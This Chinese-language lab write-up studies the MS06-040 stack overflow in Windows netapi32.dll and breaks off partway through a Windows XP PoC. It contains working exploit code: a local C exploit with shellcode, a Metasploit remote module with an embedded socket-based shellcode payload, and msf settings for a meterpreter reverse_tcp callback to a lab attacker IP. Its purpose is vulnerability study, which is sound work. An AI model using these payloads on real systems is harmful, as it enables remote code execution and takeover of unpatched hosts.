3 个文件，一个客户端 stub（有些文献把 stub 翻译成“插桩”或“码桩”），一个服务端 stub，还有一个 RPC 调用的头文件。其中 stub 负责 RPC 调用过程中所有的网络操作细节。 在本章中将会用到 MS06-040 所需的接口文件，您可在看雪相关板块中下载附件。用 MIDL 编译接口文件rpc_exploit_040.acf 和 rpc_exploit_040.idl，得到 stub 文件和头文件。MIDL 编译器在 VC6.0 的组件里，可以在命令行下使用： 1midl /acf rpc_exploit_040.acf rpc_exploit_040.idl 编译成功后，会在当前路径生成 3 个文件： （ 1） rpc_exploit_040_s.c RPC 服务端 stub（桩） （ 2） rpc_exploit_040_c.c R PC 客户端 stub（桩） （ 3） rpc_exploit_040.h RPC 头文件 把两个 stub 添加进工程， include 头文件，和调用远程函数的程序一起 link，您就可以试着 去调用远程主机上的函数了。 MS06-040 MS06-040 简介 MS06-040 是这个漏洞的微软编号，其 CVE 编号为 CVE-2006-3439，对应补丁号为KB921883。 几乎所有使用 socket 网络的程序都会加载负责网络操作的 netapi32.dll。 MS06-040 指的就是这个动态链接库中的导出函数 NetpwPathCanonicalize() 中存在的缓冲溢出缺陷，而NetpwPathCanonicalize() 函数又可以被 RPC 远程调用，所以才会有这么大的危害。 动态调试 NetpwPathCanonicalize()是 netapi32.dll 的一个导出函数，用于格式化网络路径字符串，它的原型如下： 12345678int NetpwPathCanonicalize ( uint16 path[ ], //[in] path name uint8 can_path[ ], //[out] canonicalizedpath uint32 maxbuf, //[in] max size of can_path uint16 prefix[ ], //[in] path prefix uint32* pathtype, //[in out] path type uint32 pathflags //[in] path flags, 0 or 1); 这是一个 Unicode 字符串处理函数，大体功能是：如果 prefix 串非空，将 prefix 串与 path串用‘ \\’相连，并复制到输出串 can_path 中，输出串的容量为 maxbuf 字节大小： 1prefix ＋ ‘\\’ ＋ path =&gt; can_path [max_buf] 在路径合并过程中，函数会做各种检查，如 prefix 或 path 长度是否越界、是否符合路径规范，或 can_path 的容量是否够大等等，否则函数将退出，并返回相应的错误号，例如，ERROR_INVALID_NAME （ 0x7B ）， ERROR_INVALID_PARAMETER （ 0x135 ），NERR_BufTooSmall（ 0x84B）等；函数成功则返回 0，并对 pathtype 进行更新。 首先在本地直接装载有漏洞的动态链接库，并调用这个函数，等到弄清楚栈中的细节之后，再实践远程利用。 触发这个漏洞的 POC 如下： 1234567891011121314151617181920212223242526#include &lt;windows.h&gt;typedef void (*MYPROC)(LPTSTR, LPTSTR, int, LPTSTR, long *, long); int main() &#123; char path[0x320]; char can_path[0x440]; int maxbuf = 0x440; char prefix[0x100]; long pathtype = 44; HINSTANCE LibHandle; MYPROC Trigger; char dll[] = &quot;./netapi32.dll&quot;; char VulFunc[] = &quot;NetpwPathCanonicalize&quot;; LibHandle = LoadLibrary(dll); Trigger = (MYPROC)GetProcAddress(LibHandle, VulFunc); memset(path, 0, sizeof(path)); memset(path, &#x27;a&#x27;, sizeof(path) - 2); memset(prefix, 0, sizeof(prefix)); memset(prefix, &#x27;b&#x27;, sizeof(prefix) - 2); (Trigger)(path, can_path, maxbuf, prefix, &amp;pathtype, 0); FreeLibrary(LibHandle); return 0;&#125; 这段代码的功能是装载存在漏洞的 netapi32.dll，并调用其导出函数 NetpwPathCanonicalize。在函数调用时我们将 path 和 prefix 设置成很长的字符串，用以触发栈溢出。注意这个字符串以两个字节的 null 结束，这是因为 NetpwPathCanonicalize 将按照 Unicode 来处理字符串。 memset()函数，将缓冲区设置为指定字符。 推荐的环境 备 注 操作系统 winXP SP3 本地调试与操作系统版本无关 漏洞文件 netapi32.dll 在没有 patch 过 KB921883 的 Window 2000 操作系统中，该文件位于 c:\\winnt\\system32 下 ； 若操作系统已经被 patch ， 可 以在 c:\\winnt$NtUninstallKB921883$下找到该文件；您也可以在本章的附带资料中找到这个动态链接库文件 编译器 VC++ 6.0 编译选项 默认编译选项 build 版本 Release 版本 debug 版本在调试时可能会有细节上的差异 注意： 需要未打补丁的netapi32.dll，Windows 2000在C:\\WINNT\\system32目录下能找到，或者用以下提供的dll，但远程exploit必须要带有未打补丁dll的系统。本实验指导的调试基于使用的漏洞文件大小为 309008 字节，您可以在本章附带的电子资料中找到这个文件，请您在编译运行 POC 代码时将这个漏洞文件放在工程的相同路径下。 netapi32.dll 下载链接:https://pan.baidu.com/s/1qZQ1vnY 密码:5stq 定位程序崩溃点 编译运行后，系统会提示出错，直接点调试。进入OD后，按 F9 运行到程序崩溃处，可以看到 EBP 和 EIP 都被覆盖为 “aaaa”。 重新加载程序，调试来到 call netapi32.NetpwPathCanonicalize 处。 进入 NetpwPathCanonicalize() 函数体后，按 “F8” 键继续单步跟踪。程序将在另一次函数调用时崩溃。 重新加载，“F7” 继续跟进，最后发现，在函数返回前 pop ebx 中，向栈中压入了大量 b 充当无效数据，导致在 retn 时，返回地址错误，发生崩溃。 构造exploit 反复跟踪后溢出函数后，发现这段程序首先将 prefix 所指的字符串“ bbbbbb……” 复制到栈中，然后在这个字符串后加上 Unicode 字符“\\”（ 0x5C00），再将 path 中的长字符串“ aaaa……”连接在末尾，而正是连接 path 串的 wcscat 调用触发了漏洞。 程序“跑飞”之前的系统状态。 （ 1） prefix 串中包含了 0xFE 个字符‘b’（ 0x62），被复制到栈帧中开始于 0x0012F240 处的缓冲区。 （ 2）程序在 prefix 的末尾连接上 Unicode 字符‘ \\’（ 0x005C）。 （ 3）程序在‘ \\’后连接 0x31E 个字符‘ a’（ 0x61），这次字符串连接操作造成了栈帧溢出，位于 0x0012F654 处的 EBP 及紧随其后的返回地址都被改写。(图26.2.6地址与本次实验地址不同) ECX 在函数返回时总是指向栈中缓冲区，因此我们可以把 shellcode 放在 prefix 串中，并采用JMP ECX 作为定位 shellcode 的跳板。用 OllyDbg 在内存中搜索指令 JMP ECX。 用 netapi32.dll 自身代码空间中 0x751852F9 处的 CALL ECX 作为跳转指令。 布置缓冲区如下。 （ 1）缓冲区中的内容为： (prefi x:bbb …) +（ \\） +（ path: aaa…）。 （ 2）目前 prefix 串大小为 0x100（ 256）字节，除去两个字节 null 作为结束符， 254 字节基本能够容纳 shellcode。 （ 3）缓冲区起址： 0x0012F240。 （ 4） EBP 位置： 0x0012F654。 （ 5）返回地址： 0x0012F240。 （ 6）返回地址距离缓冲区的偏移为： 0x0012F654-0x0012F240=0x418，去掉 prefix 和 ‘ \\’ 的影响， path 串偏移 0x418-0x100=0x318 处的 DWORD 将淹没返回地址，在那里填入跳转地址即可执行 shellcode。 仍然使用弹出“ failwest”消息框的 shellcode 进行测试，最终的本地溢出利用代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041#include &quot;stdafx.h&quot;#include &lt;windows.h&gt;typedef void (*MYPROC)(LPTSTR, LPTSTR, int, LPTSTR, long *, long);char shellcode[]= &quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; &quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot; &quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot; &quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot; &quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot; &quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot; &quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot; &quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot; &quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot; &quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot; &quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot;;int main()&#123; char path[0x320]; char can_path[0x440]; int maxbuf=0x440; char prefix[0x100]; long pathtype=44; HINSTANCE LibHandle; MYPROC Trigger; char dll[] = &quot;./netapi32.dll&quot;; // care for the path char VulFunc[] = &quot;NetpwPathCanonicalize&quot;; LibHandle = LoadLibrary(dll); Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc); memset(path,0,sizeof(path)); memset(path,0x90,sizeof(path)-2); memset(prefix,0,sizeof(prefix)); memset(prefix,&#x27;a&#x27;,sizeof(prefix)-2); memcpy(prefix,shellcode,168); path[0x318]=0xF9;// address of CALL ECX path[0x319]=0x52; path[0x31A]=0x18; path[0x31B]=0x75; (Trigger)(path,can_path,maxbuf,prefix,&amp;pathtype,0); FreeLibrary(LibHandle);&#125; 编译运行，就能看到 failwest 消息框了。 总结一下动态调试的思路。 （ 1）第一次调试看到 EIP 已经被改写为 0x61616161，证明传入的参数可以制造溢出并控制EIP，但堆栈被破坏，无法看到溢出前的函数调用。 （ 2）跟踪调试，找到 NetpwPathCanonicalize 的 VA 地址，直接对这个 VA 地址下断点。 （ 3）单步跟踪 NetpwPathCanonicalize 函数，观察寄存器的变化，发现是其中的一次函数调用引起的错误。 （ 4）第三次调试直接针对 NetpwPathCanonicalize 中引起错误的子函数，单步跟踪一轮后，彻底弄清楚栈中布局，编写本地 exploit。 静态分析 通过 IDA 加载 netapi32.dll，找到漏洞的缺陷代码，NetpwPathCanonicalize 函数中的 CanoicalizePathName 函数，如下图黄色框内。 在动态调试时，我们已经知道产生溢出的函数实际上是 0x7517F856 处调用的的子函数 CanonicalizePathName()， prefix 串与 path 串的合并操作就位于其中，该函数的声明如下： 1234567int CanonicalizePathName ( uint16 prefix[ ], // [in] path prefix uint16 path[ ], // [in] path name uint8 can_path[ ], // [out] canonicalized path uint32 maxbuf, // [in] max byte size of can_path uint32 can_size // [in out] byte size of can_path); 用 IDA 重点看一下这个函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586; =============== S U B R O U T I N E ===============================; int stdcall CanonicalizePathName(wchar_t *, wchar_t *, wchar_t*, int, int)7517FC68 CanonicalizePathName proc near7517FC687517FC68 Buff_last_word = word ptr -416h7517FC68 Buff_OF = word ptr -414h7517FC68 arg_Prefix = dword ptr 87517FC68 arg_Path = dword ptr 0Ch7517FC68 arg_CanPath = dword ptr 10h7517FC68 arg_Maxbuf = dword ptr 14h7517FC68 arg_CanSize = dword ptr 18h7517FC687517FC68 push ebp7517FC69 mov ebp, esp7517FC6B sub esp, 414h ; 分配 0x414 字节栈空间，即 Buff_OF，用来 ; 存储合并路径(prefix+’\\’+path)7517FC71 push ebx7517FC72 push esi7517FC73 xor esi, esi7517FC75 push edi7517FC76 cmp [ebp+arg_Prefix], esi7517FC79 mov edi, ds:__imp_wcslen7517FC7F mov ebx, 411h ; ebx 始终等于 0x411，用于检查越界（字节） ; 长度7517FC84 jz short @@prefix_ptr_zero7517FC86 push [ebp+arg_Prefix]7517FC89 call edi ; __imp_wcslen ; 计算 prefix 串的 Unicode 长度，注意为字 ; 节长度的一半，这是导致边界检查被突破的根 ; 本原因，即用 Unicode 检查边界，而栈空间 ; 是按字节开的7517FC8B mov esi, eax ; esi 始终记录 prefix 串的 Unicode 长度7517FC8D pop ecx7517FC8E test esi, esi7517FC90 jz short @@chk_pathname7517FC92 cmp esi, ebx ; prefix 是否大于 0x4117517FC94 ja @@err_invalid_name ; 若越界，则退出程序7517FC9A push [ebp+arg_Prefix]7517FC9D lea eax, [ebp+Buff_OF]7517FCA3 push eax7517FCA4 call ds:__imp_wcscpy ; 将 prefix 串写入栈空间 Buff_OF 暂存。虽然前 ; 面的边界检查有缺陷，似乎实际可以传入的 prefix ; 串可以达到 0x822 字节，但是在传入本函数前, ; prefix 串已被 NetpwPathType()检查过，其长度 ; 不能超过 0x206 字节，所以光靠这里的检查缺陷 ; 还不足以通过 prefix 串制造溢出…7517FCED @@prefix_ptr_zero:7517FCED mov [ebp+Buff_OF], si7517FCF4 @@chk_pathname:7517FCF4 push [ebp+arg_Path]7517FCF7 call edi ; __imp_wcslen ; 计算 path 串的 Unicode 长度7517FCF9 add eax, esi ; 合并前，计算合并路径(prefix+’\\’+path)的 ; Unicode 长度7517FCFB pop ecx7517FCFC cmp eax, ebx ; 第二次边界检查，仍然将 Unicode 字符长度与 ; 字节长度 0x411 进行比较7517FCFE ja short @@err_invalid_name ; 从前面的分析可以知道，只靠 prefix 串是无法 ; 制造溢出的，但是 path 串的传入没有任何限制， ; 所以可以通过增加 path 串的长度溢出。栈空间 ; 为 0x414，我们实际可以传入的串总长可以达到 ; 或或超过 0x8287517FD00 push [ebp+arg_Path]7517FD03 lea eax, [ebp+Buff_OF]7517FD09 push eax7517FD0A call ds:__imp_wcscat ; 将 path 串继续连入 Buff_OF，生成最终 ; 的合并路径，这个调用导致了最终的栈溢出…7517FD3E @@err_invalid_name:7517FD3E push ERROR_INVALID_NAME7517FD40 pop eax7517FD41 jmp short @@quit…7517FD7A @@quit:7517FD7A pop edi7517FD7B pop esi7517FD7C pop ebx7517FD7D leave7517FD7E retn 14h7517FD7E CanonicalizePathName endp; =============== S U B R O U T I N E =============================== 两次边界检查的限制都是 Unicode 长度不能超过 0x411，换算成字节长度就是 0x822，而栈空间的大小是按字节开的 0x414。按照 ASCII 字符开辟空间，按照 Unicode 字符来检查边界是漏洞的根本原因。 依据以上的溢出原理，只要设计好 prefix 串和 path 串的长度，调用 NetpwPath Canonicalize 函数即可发生栈溢出。 实现远程 exploit 进行 RPC 调用的代码框架： 12345678910111213141516171819202122232425262728293031323334353637383940class MetasploitModule &lt; Msf::Exploit::Remote Rank = GoodRanking include Msf::Exploit::Remote::DCERPC include Msf::Exploit::Remote::SMB::Client end def initialize(info = &#123;&#125;) super(update_info(info, &#x27;Name&#x27; =&gt; &#x27;MS06-040 Remote overflow POC &#x27;, &#x27;Platform&#x27; =&gt; &#x27;win&#x27;, &#x27;Targets&#x27; =&gt; [[&#x27;Windows 2000 SP0&#x27;, &#123;&#x27;Ret&#x27; =&gt; [0x318, 0x74FB62C3]&#125; ]] )) register_options([OptString.new( &#x27;SMBPIPE&#x27;, [true,&quot;(BROWSER, SRVSVC)&quot;, &#x27;BROWSER&#x27;] ),], self.class)end #end of initialize def exploit connect() smb_login() handle = dcerpc_handle(&#x27;4b324fc8-1670-01d3-1278-5a47bf6ee188&#x27;, &#x27;3.0&#x27;, &#x27;ncacn_np&#x27;, [&quot;\\\\#&#123;datastore[&#x27;SMBPIPE&#x27;]&#125;&quot;]) dcerpc_bind(handle) prefix = ...... path = ...... stub =NDR.long(rand(0xffffffff)) + NDR.UnicodeConformantVaryingString(&#x27;&#x27;) + NDR.UnicodeConformantVaryingStringPreBuilt(path) + NDR.long(rand(0xf0)+1) + NDR.UnicodeConformantVaryingStringPreBuilt(prefix) + NDR.long(rand(0xf0)+1) + NDR.long(0) dcerpc.call(0x1f, stub) # call NetpwPathCanonicalize() disconnect end #end of exploit defend 我们只需要关注 path 串和 prefix 串的内容，在恰当的位置布置特定的内容， MSF 和远程的主机会自动按照 RPC 协议为我们完成网络握手、参数解析、函数定位等工作。 攻击代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758class MetasploitModule &lt; Msf::Exploit::Remote Rank = GoodRanking include Msf::Exploit::Remote::DCERPC include Msf::Exploit::Remote::SMB::Client # 主要就是上面这几行，还有最后一行多了一个end def initialize(info = &#123;&#125;) super(update_info(info, &#x27;Name&#x27; =&gt; &#x27;MS06-040 Remote overflow POC &#x27;, &#x27;Platform&#x27; =&gt; &#x27;win&#x27;, &#x27;Targets&#x27; =&gt; [[&#x27;Windows 2000 SP0&#x27;, &#123;&#x27;Ret&#x27; =&gt; [0x318 , 0x74FB62C3]&#125; ]] )) register_options([OptString.new( &#x27;SMBPIPE&#x27;, [true,&quot;(BROWSER, SRVSVC)&quot;, &#x27;BROWSER&#x27;] ),], self.class) end #end of initialize def exploit connect() smb_login() handle = dcerpc_handle(&#x27;4b324fc8-1670-01d3-1278-5a47bf6ee188&#x27;, &#x27;3.0&#x27;, &#x27;ncacn_np&#x27;, [&quot;\\\\#&#123;datastore[&#x27;SMBPIPE&#x27;]&#125;&quot;]) dcerpc_bind(handle) prefix = &quot;\\x8B\\xC1\\x83\\xC0\\x05\\x59\\x81\\xC9\\xD3\\x62\\x30\\x20\\x41\\x43\\x4D\\x64&quot;+ &quot;\\x99\\x96\\x8D\\x7E\\xE8\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\\x49\\x1C\\x8B&quot;+ &quot;\\x09\\x8B\\x69\\x08\\xB6\\x03\\x2B\\xE2\\x66\\xBA\\x33\\x32\\x52\\x68\\x77\\x73&quot;+ &quot;\\x32\\x5F\\x54\\xAC\\x3C\\xD3\\x75\\x06\\x95\\xFF\\x57\\xF4\\x95\\x57\\x60\\x8B&quot;+ &quot;\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\\x20\\x03\\xDD\\x33\\xFF\\x47&quot;+ &quot;\\x8B\\x34\\xBB\\x03\\xF5\\x99\\xAC\\x34\\x71\\x2A\\xD0\\x3C\\x71\\x75\\xF7\\x3A&quot;+ &quot;\\x54\\x24\\x1C\\x75\\xEA\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59&quot;+ &quot;\\x1C\\x03\\xDD\\x03\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3B\\xF7\\x75\\xB4\\x5E&quot;+ &quot;\\x54\\x6A\\x02\\xAD\\xFF\\xD0\\x88\\x46\\x13\\x8D\\x48\\x30\\x8B\\xFC\\xF3\\xAB&quot;+ &quot;\\x40\\x50\\x40\\x50\\xAD\\xFF\\xD0\\x95\\xB8\\x02\\xFF\\x1A\\x0A\\x32\\xE4\\x50&quot;+ &quot;\\x54\\x55\\xAD\\xFF\\xD0\\x85\\xC0\\x74\\xF8\\xFE\\x44\\x24\\x2D\\x83\\xEF\\x6C&quot;+ &quot;\\xAB\\xAB\\xAB\\x58\\x54\\x54\\x50\\x50\\x50\\x54\\x50\\x50\\x56\\x50\\xFF\\x56&quot;+ &quot;\\xE4\\xFF\\x56\\xE8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;+ &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;+ &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;+ &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x00\\x00&quot; path = &quot;\\x90&quot; * 0x318 + [target[&#x27;Ret&#x27;][1]].pack(&#x27;V&#x27;) + &quot;\\x04\\xD0\\xFD\\x7F&quot; * 5 + # writeable address &quot;\\x66\\x81\\xEC\\x30\\x04&quot; + # sub esp,430 &quot;\\x8B\\xC4&quot; + # mov eax, esp &quot;\\xFF\\xE4&quot; + # jmp esp &quot;\\x00\\x00&quot; stub =NDR.long(rand(0xffffffff)) + NDR.UnicodeConformantVaryingString(&#x27;&#x27;) + NDR.UnicodeConformantVaryingStringPreBuilt(path) + NDR.long(rand(0xf0)+1) + NDR.UnicodeConformantVaryingStringPreBuilt(prefix) + NDR.long(rand(0xf0)+1) + NDR.long(0) dcerpc.call(0x1f, stub) # call NetpwPathCanonicalize() disconnect end #end of exploit defend 配置 攻击机：kali IP地址：192.168.188.141 靶机：Windows2000 sp4 IP地址：192.168.188.133 准备 首先确定靶机开启的端口： 1234567891011121314151617181920212223┌──(host㉿kali)-[~]└─$ sudo nmap --allports -O 192.168.188.133 [sudo] host 的密码：Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-15 21:22 CSTNmap scan report for 192.168.188.133Host is up (0.00030s latency).Not shown: 995 closed tcp ports (reset)PORT STATE SERVICE135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-ds1025/tcp open NFS-or-IIS1723/tcp open pptpMAC Address: 00:0C:29:97:7A:5F (VMware)Device type: general purposeRunning: Microsoft Windows 2000|XPOS CPE: cpe:/o:microsoft:windows_2000::- cpe:/o:microsoft:windows_2000::sp1 cpe:/o:microsoft:windows_2000::sp2 cpe:/o:microsoft:windows_2000::sp3 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_xp::- cpe:/o:microsoft:windows_xp::sp1OS details: Microsoft Windows 2000 SP0 - SP4 or Windows XP SP0 - SP1Network Distance: 1 hopOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 3.64 seconds 可以看到打开了445端口。 最后的配置： 123456789101112131415161718192021222324252627282930msf6 exploit(rgzz/ms06_040) &gt; show optionsModule options (exploit/rgzz/ms06_040): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 192.168.188.133 yes The target host(s), see https://gith ub.com/rapid7/metasploit-framework/w iki/Using-Metasploit RPORT 445 yes The SMB service port (TCP) SMBPIPE BROWSER yes (BROWSER, SRVSVC)Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none) LHOST 192.168.188.141 yes The listen address (an interface ma y be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Windows 2000 SP0 用上面给出的代码，结果出错了，导致了靶机关机。 调试 service.exe 将OD附加到services上，然后在NetpwPathCanonicalize（0x75107AFD）上下一个断点，F9继续执行。 回到攻击机上，执行exploit，再回到靶机，发现并没有在 NetpwPathCanonicalize 停下，而是直接提示关机，这样就无法进行后续调试了。不知道是不是漏洞已经被修补的缘故。上面的本地实验中，我用的也是本书资料中提供的netapi32.dll。 Windows XP 环境下的 MS06—040 exploit 静态分析 选取 Windows XP SP3 的 netapi32.dll，对其 CanonicalizePathName 函数做静态分析。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394; =============== S U B R O U T I N E =======================================; int __stdcall CanonicalizePathName(wchar_t*, wchar_t *, wchar_t *, int, int)71BA428B CanonicalizePathName proc near71BA428B71BA428B Buff_last_word = word ptr -416h71BA428B Buff_OF = word ptr -414h71BA428B arg_Prefix = dword ptr 871BA428B arg_Path = dword ptr 0Ch71BA428B arg_CanPath = dword ptr 10h71BA428B arg_Maxbuf = dword ptr 14h71BA428B arg_CanSize = dword ptr 18h71BA428B71BA428B push ebp71BA428C mov ebp, esp71BA428E sub esp, 414h ; 依然分配了 0x414 字节栈空间，即 Buff_OF， ; 用来存储合并路径(prefix+’\\’+path)71BA4294 push ebx71BA4295 mov ebx, ds:__imp_wcscat71BA429B push esi71BA429C xor esi, esi71BA429E cmp [ebp+arg_Prefix], esi ; prefix 指针是否为 071BA42A1 push edi71BA42A2 mov edi, ds:__imp_wcslen71BA42A8 jnz @@prefix_ptr_not_zero ; 若 prefix 非 0，跳转至@@prefix_ptr_not_zero71BA42AE mov [ebp+Buff_OF], si ; 若 prefix 为 0，初始化 Buff_OF 为空串71BA42B5 @@chk_pathname:71BA42B5 push [ebp+arg_Path]71BA42B8 call edi ; __imp_wcslen ; 计算 path 串的 Unicode 长度71BA42BA add eax, esi ; 计算合并路径长度71BA42BC cmp eax, 207h ; 对合并路径长度做越界检查，请注意，这里已经将 ; 字节长度除 2，转化为 unicode 长度 0x207，而 ; 在 Windows 2000 中，这个值是 0x411,没有做 ; 转化，可见 Windows XP 的溢出另有原因！71BA42C1 pop ecx71BA42C2 ja @@err_invalid_name71BA42C8 push [ebp+arg_Path]71BA42CB lea eax, [ebp+Buff_OF]71BA42D1 push eax71BA42D2 call ebx ; __imp_wcscat ; 将 Buff_OF(prefix+’\\’)与 path 串合并 ; 得到合并路径…71BA4317 lea eax, [ebp+Buff_OF]71BA431D push eax71BA431E call edi ; __imp_wcslen ; 计算合并路径 Unicode 长度71BA4320 lea eax, [eax+eax+2] ; 将 Unicode 长度转化为字节长度并加上结尾 ; 的两个空字节71BA4324 cmp eax, [ebp+arg_Maxbuf] ; 检查 can_path 的容量 maxbuf，是否可以 ; 可以容纳合并路径71BA4327 pop ecx71BA4328 ja @@err_buf_too_small ; 若 can_path 空间不够，退出71BA432E lea eax, [ebp+Buff_OF]71BA4334 push eax71BA4335 push [ebp+arg_CanPath]71BA4338 call ds:__imp_wcscpy ; 将合并路径复制 Buff_OF 至 can_path71BA433E pop ecx71BA433F pop ecx71BA4340 xor eax, eax ; 路径合并成功，返回 071BA4342 @@quit:71BA4342 pop edi71BA4343 pop esi71BA4344 pop ebx71BA4345 leave71BA4346 retn 14h71BA4349 @@err_invalid_name:71BA4349 push ERROR_INVALID_NAME71BA434B pop eax71BA434C jmp short @@quit71BA434C CanonicalizePathName endp…71BB0E2D @@prefix_ptr_not_zero:71BB0E2D push [ebp+arg_Prefix]71BB0E30 call edi ; __imp_wcslen71BB0E32 mov esi, eax ; esi 存储 prefix 串的 unicode 长度71BB0E34 test esi, esi ; 检查 prefix 串长度是否为 0，即空串71BB0E36 pop ecx71BB0E37 jz @@chk_pathname ; 如果 prefix 为空串，则跳至 ; @@chk_pathname，请注意，如果代码 ; 流程走到这里， Buff_OF 始终是没有初 ; 始化的！这是 MS06-040 的另一个溢出点71BB0E3D cmp esi, 208h ; 如果 prefix 串非空，其 Unicode 长度 ; 不能超过 0x208，否则退出71BB0E43 ja @@err_invalid_name…71BB0EA9 @@err_buf_too_small:71BB0EA9 mov ecx, [ebp+arg_CanSize]71BB0EAC test ecx, ecx71BB0EAE jz short @@err_buf_too_small271BB0EB0 mov [ecx], eax71BB0EB2 @@err_buf_too_small2:71BB0EB2 mov eax, NERR_BufTooSmall71BB0EB7 jmp @@quit…; =============== S U B R O U T I N E ======================================= 从上面的第 31 行中可以看到，上一个实验中 cmp eax,411 已经被修补，无法在利用。不过，通过进一步静态分析，可以发现 CanonicalizePathName 函数在分配了栈空间 Buff_OF 后，没有进行初始化；如果 prefix 指针为 0，代码会对 Buff_OF 做初始化（见 0x71BA42AE）；而如果 prefix 非 0，并指向空字串，代码将直接对未初始化的 Buff_OF 和 path 串用 wcscat 函数进行连接（见 0x71BA42B5-0x71BA42D2）。这是一个非常危险的操作，因为未初始化的栈空间 Buff_OF 的长度是未知的，甚至可能超过 0x414 字节，其后再连接上 path 串，很有可能产生溢出。 由于 Buff_OF 位于栈中，内容随机，怎样控制它的长度，是如何利用这个漏洞的重点。我们可以通过连续调用 CanonicalizePathName 函数来控制它的长度。 因为当 Buff_OF 被首次填充并连接，直到 CanonicalizePathName 函数退出后，其所在的栈空间位于 ESP 的低地址，如果不做任何栈操作，如函数调用等，内容是不会改变的；此时，如果再次调用 CanonicalizePathName，已经被填充的 Buff_OF 将面临溢出的风险。 CanonicalizePathName 是 NetpwPathCanonicalize 的子函数，不能直接被调用。分析一下函数 NetpwPathCanonicalize 是如何调用 CanonicalizePathName 的。 12345678910111213141516171819202122232425262728293031323334353637...71BA421A mov esi, [ebp+arg_CanPath]71BA421D push edi71BA421E push [ebp+arg_Maxbuf]71BA4221 mov [esi], di71BA4224 push esi71BA4225 push [ebp+arg_Path]71BA4228 push ebx71BA4229 call CanonicalizePathName71BA422E cmp eax, edi ; 检查函数 CanonicalizePathName 的返回值71BA4230 jnz short @@quit ; 非 0 则直接退出71BA4232 push edi71BA4233 push [ebp+arg_Pathtype]71BA4236 push esi71BA4237 call NetpwPathType71BA423C jmp short @@quit...; =============== S U B R O U T I N E =======================================; int __stdcall NetpwPathCanonicalize(wchar_t *, wchar_t *, int, int, int, int)71BA4244 public NetpwPathCanonicalize71BA4244 NetpwPathCanonicalize proc near71BA424471BA4244 arg_Path = dword ptr 871BA4244 arg_CanPath = dword ptr 0Ch71BA4244 arg_Maxbuf = dword ptr 10h71BA4244 arg_Prefix = dword ptr 14h71BA4244 arg_Pathtype = dword ptr 18h71BA4244 arg_Pathflags = dword ptr 1Ch...71BA4284 @@quit71BA4284 pop edi71BA4285 pop esi71BA4286 pop ebx71BA4287 pop ebp71BA4288 retn 18h71BA4288 NetpwPathCanonicalize endp... 如果能够使 CanonicalizePathName 调用失败（返回值非 0），NetpwPathCanonicalize 将直接退出，从而保证 Buff_OF 所在的栈空间不发生变化。由于参数 maxbuf 是可控的，我们可 以 利 用 较 小 的 maxbuf ， 使 CanonicalizePathName 返 回 NERR_BufTooSmall （参看 0x71BA4317-0x71BA4328）而直接退出。 MS06-040 在 Windows XP 下溢出的 POC 代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;windows.h&gt;typedef void (__stdcall * MYPROC)(LPTSTR, LPTSTR, int, LPTSTR, long *, long);#define PATH1_SIZE (0xc2*2)#define PATH2_SIZE (0x150*2)#define OUTBUF_SIZE 0x440#define PREFIX_SIZE 0x410int main()&#123; char PathName1[PATH1_SIZE]; char PathName2[PATH2_SIZE]; char Outbuf[OUTBUF_SIZE]; int OutbufLen=OUTBUF_SIZE; char Prefix1[PREFIX_SIZE]; char Prefix2[PREFIX_SIZE]; long PathType1=44; long PathType2=44; 